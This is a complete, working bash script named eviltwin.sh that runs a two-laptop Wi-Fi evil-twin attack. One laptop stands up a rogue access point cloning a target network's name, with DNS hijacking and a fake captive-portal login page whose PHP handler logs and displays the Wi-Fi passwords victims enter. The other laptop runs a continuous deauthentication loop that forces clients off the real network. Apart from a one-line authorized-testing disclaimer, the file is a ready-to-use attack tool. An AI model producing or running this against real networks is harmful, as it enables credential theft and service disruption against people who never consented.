#!/usr/bin/env bash
# eviltwin.sh — two-laptop evil twin chain, single file.
#
#   Laptop A:  sudo ./eviltwin.sh ap
#   Laptop B:  sudo ./eviltwin.sh recon        (scan, then ctrl-c)
#   Laptop B:  sudo ./eviltwin.sh attack       (deauth loop)
#
#   Cleanup:   sudo ./eviltwin.sh teardown     (either laptop)
#
# Target config: edit TARGET_* below, or override via env:
#   sudo TARGET_SSID="MyWiFi" TARGET_BSSID="AA:..:FF" TARGET_CH=6 ./eviltwin.sh ap
#
# For authorized security testing only.
set -euo pipefail

# ── target config (edit here, or override with env) ──────────────────────
TARGET_SSID="${TARGET_SSID:-MyHomeWiFi}"
TARGET_BSSID="${TARGET_BSSID:-AA:BB:CC:DD:EE:FF}"
TARGET_CH="${TARGET_CH:-6}"
PIN_BSSID="${PIN_BSSID:-0}"           # 1 = pin rogue AP to real BSSID (WPA3-pinned clients)

# ── interface config ─────────────────────────────────────────────────────
AP_IF="${AP_IF:-wlan0}"               # Laptop A: AP interface
MON_IF="${MON_IF:-wlan0}"             # Laptop B: monitor/deauth interface

# ── network / paths (usually leave alone) ────────────────────────────────
AP_IP="${AP_IP:-192.168.99.1}"
DHCP_RANGE="${DHCP_RANGE:-192.168.99.10,192.168.99.100,255.255.255.0,12h}"
DEAUTH_BURST="${DEAUTH_BURST:-10}"
DEAUTH_SLEEP="${DEAUTH_SLEEP:-3}"
WORK="${WORK:-/tmp/eviltwin}"
PORTAL_DIR="${PORTAL_DIR:-/var/www/evil}"
LOG="$WORK/creds.log"
HOSTAPD_CONF="$WORK/hostapd.conf"
DNSMASQ_CONF="$WORK/dnsmasq.conf"
NGINX_SITE="/etc/nginx/sites-available/evil"
NGINX_LINK="/etc/nginx/sites-enabled/evil"

# ── helpers ──────────────────────────────────────────────────────────────
c() { printf '\033[%sm%s\033[0m\n' "$1" "$2"; }
info()  { c '1;36' "[*] $*"; }
ok()    { c '1;32' "[+] $*"; }
warn()  { c '1;33' "[!] $*"; }
die()   { c '1;31' "[x] $*" >&2; exit 1; }

need_root() { [[ $EUID -eq 0 ]] || die "run as root"; }

need_cmds() {
  local miss=()
  for t in "$@"; do
    command -v "$t" >/dev/null 2>&1 || miss+=("$t")
  done
  ((${#miss[@]} == 0)) || die "missing: ${miss[*]} — apt install hostapd dnsmasq nginx php-fpm aircrack-ng iw"
}

# ══════════════════════════════════════════════════════════════════════════
# ROLE: ap  — Laptop A
# ══════════════════════════════════════════════════════════════════════════
role_ap() {
  need_root
  need_cmds hostapd dnsmasq nginx php-fpm8.2 ip sed

  mkdir -p "$WORK" "$(dirname "$LOG")" "$PORTAL_DIR"
  chmod 750 "$(dirname "$LOG")"

  PIDS=()
  cleanup() {
    set +e
    warn "tearing down AP"
    for p in "${PIDS[@]:-}"; do kill "$p" 2>/dev/null; done
    pkill -f "hostapd $HOSTAPD_CONF" 2>/dev/null
    pkill -f "dnsmasq -C $DNSMASQ_CONF" 2>/dev/null
    rm -f "$NGINX_LINK"
    nginx -t >/dev/null 2>&1 && systemctl reload nginx 2>/dev/null
    ip addr flush dev "$AP_IF" 2>/dev/null
    ip link set "$AP_IF" down 2>/dev/null
    ok "clean"
  }
  trap cleanup EXIT INT TERM

  # ── hostapd ──
  cat > "$HOSTAPD_CONF" <<EOF
interface=$AP_IF
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$TARGET_CH
auth_algs=1
wmm_enabled=1
ignore_broadcast_ssid=0
EOF
  [[ "$PIN_BSSID" == "1" ]] && echo "bssid=$TARGET_BSSID" >> "$HOSTAPD_CONF"

  info "hostapd on $AP_IF"
  ip link set "$AP_IF" down || true
  ip link set "$AP_IF" up
  hostapd "$HOSTAPD_CONF" > "$WORK/hostapd.log" 2>&1 &
  PIDS+=($!)
  sleep 2
  grep -q "AP-ENABLED" "$WORK/hostapd.log" || die "hostapd failed: $(tail -n3 "$WORK/hostapd.log")"
  ok "rogue AP up: $TARGET_SSID ch $TARGET_CH"

  # ── dnsmasq ──
  cat > "$DNSMASQ_CONF" <<EOF
interface=$AP_IF
bind-interfaces
dhcp-range=$DHCP_RANGE
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
address=/#/$AP_IP
log-queries
log-dhcp
EOF
  ip addr add "$AP_IP/24" dev "$AP_IF" 2>/dev/null || true
  ip link set "$AP_IF" up
  info "dnsmasq"
  dnsmasq -C "$DNSMASQ_CONF" --no-daemon > "$WORK/dnsmasq.log" 2>&1 &
  PIDS+=($!)
  ok "dhcp/dns on $AP_IP"

  # ── portal files ──
  cp /dev/null "$LOG"; chmod 640 "$LOG"; chown www-data:www-data "$LOG" 2>/dev/null || true

  cat > "$PORTAL_DIR/index.html" <<EOF
<!doctype html><html><head><meta charset="utf-8">
<title>WiFi Login</title>
<style>
body{font-family:system-ui;background:#0d1117;color:#e6edf3;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.card{background:#161b22;padding:2rem;border-radius:12px;width:340px;border:1px solid #30363d}
h1{font-size:1.15rem;margin:0 0 1rem;font-weight:600}
p{font-size:.85rem;color:#8b949e;margin:0 0 1rem}
input{width:100%;padding:.7rem;margin:.4rem 0;border-radius:6px;border:1px solid #30363d;background:#0d1117;color:#e6edf3;box-sizing:border-box}
button{width:100%;padding:.7rem;margin-top:.6rem;border:0;border-radius:6px;background:#238636;color:#fff;font-weight:600;cursor:pointer}
</style></head><body><div class="card">
<h1>Sign in to $TARGET_SSID</h1>
<p>Enter the network password to continue.</p>
<form method="POST" action="/capture.php">
  <input name="ssid" value="$TARGET_SSID" hidden>
  <input name="password" type="password" placeholder="WiFi password" required autofocus>
  <button type="submit">Connect</button>
</form>
</div></body></html>
EOF

  cat > "$PORTAL_DIR/capture.php" <<'EOF'
<?php
$log = '/tmp/eviltwin/creds.log';
$ip  = $_SERVER['REMOTE_ADDR'] ?? '?';
$ua  = $_SERVER['HTTP_USER_AGENT'] ?? '?';
$ssid = $_POST['ssid'] ?? '';
$pw   = $_POST['password'] ?? '';
if ($pw !== '') {
    $line = sprintf("%s\t%s\t%s\t%s\t%s\n", date('c'), $ip, $ssid, $pw, $ua);
    file_put_contents($log, $line, FILE_APPEND | LOCK_EX);
}
header('Location: https://www.google.com');
exit;
EOF

  # ── nginx vhost ──
  cat > "$NGINX_SITE" <<EOF
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    root $PORTAL_DIR;
    index index.html index.php;
    location / { try_files \$uri \$uri/ =404; }
    location ~ \.php\$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.2-fpm.sock;
    }
    location = /generate_204        { return 302 http://$AP_IP/; }
    location = /hotspot-detect.html { return 302 http://$AP_IP/; }
    location = /connecttest.txt     { return 302 http://$AP_IP/; }
    location = /redirect            { return 302 http://$AP_IP/; }
}
EOF
  ln -sf "$NGINX_SITE" "$NGINX_LINK"
  nginx -t >/dev/null 2>&1 || die "nginx config invalid (check ls /run/php/ for the fpm sock version)"
  systemctl reload nginx 2>/dev/null || systemctl restart nginx
  ok "portal live on http://$AP_IP/"

  # ── harvest ──
  ok "watching $LOG — ctrl-c to stop"
  tail -n 0 -F "$LOG" | while IFS=$'\t' read -r ts ip ssid pw ua; do
    c '1;32' "[captured] $ip  ssid=$ssid  pw=$pw"
  done
}

# ══════════════════════════════════════════════════════════════════════════
# ROLE: recon  — Laptop B
# ══════════════════════════════════════════════════════════════════════════
role_recon() {
  need_root
  need_cmds airmon-ng airodump-ng iw
  info "monitor mode on $MON_IF"
  airmon-ng check kill >/dev/null 2>&1 || true
  airmon-ng start "$MON_IF" >/dev/null 2>&1 || true
  local mon="${MON_IF}mon"
  iw dev "$mon" info >/dev/null 2>&1 || mon="$MON_IF"
  ok "monitor iface: $mon"
  info "scanning — ctrl-c when you have BSSID/ESSID/CH"
  airodump-ng "$mon"
  warn "re-run with: sudo TARGET_SSID=... TARGET_BSSID=... TARGET_CH=... ./eviltwin.sh attack"
}

# ══════════════════════════════════════════════════════════════════════════
# ROLE: attack  — Laptop B
# ══════════════════════════════════════════════════════════════════════════
role_attack() {
  need_root
  need_cmds airmon-ng aireplay-ng iw
  info "monitor mode on $MON_IF"
  airmon-ng check kill >/dev/null 2>&1 || true
  airmon-ng start "$MON_IF" >/dev/null 2>&1 || true
  local mon="${MON_IF}mon"
  iw dev "$mon" info >/dev/null 2>&1 || mon="$MON_IF"
  ok "monitor iface: $mon"

  info "testing injection"
  aireplay-ng --test "$mon" 2>&1 | grep -q "Injection is working" \
    || warn "injection test failed — deauth may not work; check adapter"

  cleanup() {
    set +e
    warn "stopping deauth"
    pkill -f "aireplay-ng.*$mon" 2>/dev/null
    airmon-ng stop "$mon" >/dev/null 2>&1
    ok "clean"
  }
  trap cleanup EXIT INT TERM

  info "deauth loop -> $TARGET_BSSID ($DEAUTH_BURST pkts / ${DEAUTH_SLEEP}s)"
  while :; do
    aireplay-ng -0 "$DEAUTH_BURST" -a "$TARGET_BSSID" "$mon" >/dev/null 2>&1 || true
    sleep "$DEAUTH_SLEEP"
  done
}

# ══════════════════════════════════════════════════════════════════════════
# ROLE: teardown  — either laptop
# ══════════════════════════════════════════════════════════════════════════
role_teardown() {
  need_root
  set +e
  pkill -f hostapd
  pkill -f "dnsmasq -C $WORK"
  pkill -f aireplay-ng
  rm -f "$NGINX_LINK"
  nginx -t >/dev/null 2>&1 && systemctl reload nginx
  airmon-ng stop wlan0mon >/dev/null 2>&1
  airmon-ng stop wlan1mon >/dev/null 2>&1
  ip addr flush dev "$AP_IF" 2>/dev/null
  ip addr flush dev "$MON_IF" 2>/dev/null
  ok "teardown complete"
}

# ══════════════════════════════════════════════════════════════════════════
# dispatch
# ══════════════════════════════════════════════════════════════════════════
usage() {
  cat <<EOF
usage: sudo ./eviltwin.sh <role> [iface]

roles:
  ap         Laptop A — rogue AP + DHCP/DNS + portal + harvest
  recon      Laptop B — monitor mode scan (ctrl-c when done)
  attack     Laptop B — deauth loop against TARGET_BSSID
  teardown   either   — kill everything, restore interfaces

env overrides:
  TARGET_SSID   default "$TARGET_SSID"
  TARGET_BSSID  default "$TARGET_BSSID"
  TARGET_CH     default "$TARGET_CH"
  AP_IF         default "$AP_IF"   (Laptop A)
  MON_IF        default "$MON_IF"  (Laptop B)
  PIN_BSSID     default "$PIN_BSSID"  (1 = pin to real BSSID)
  DEAUTH_BURST  default "$DEAUTH_BURST"
  DEAUTH_SLEEP  default "$DEAUTH_SLEEP"

examples:
  sudo TARGET_SSID="MyWiFi" TARGET_BSSID="AA:BB:CC:DD:EE:FF" TARGET_CH=6 ./eviltwin.sh ap
  sudo ./eviltwin.sh recon wlan0
  sudo TARGET_BSSID="AA:BB:CC:DD:EE:FF" ./eviltwin.sh attack
  sudo ./eviltwin.sh teardown
EOF
}

ROLE="${1:-}"
shift || true
[[ $# -gt 0 ]] && { [[ "$ROLE" == "ap" ]] && AP_IF="$1" || MON_IF="$1"; }

case "$ROLE" in
  ap)        role_ap ;;
  recon)     role_recon ;;
  attack)    role_attack ;;
  teardown)  role_teardown ;;
  ""|-h|--help|help) usage ;;
  *)         die "unknown role: $ROLE (try --help)" ;;
esac
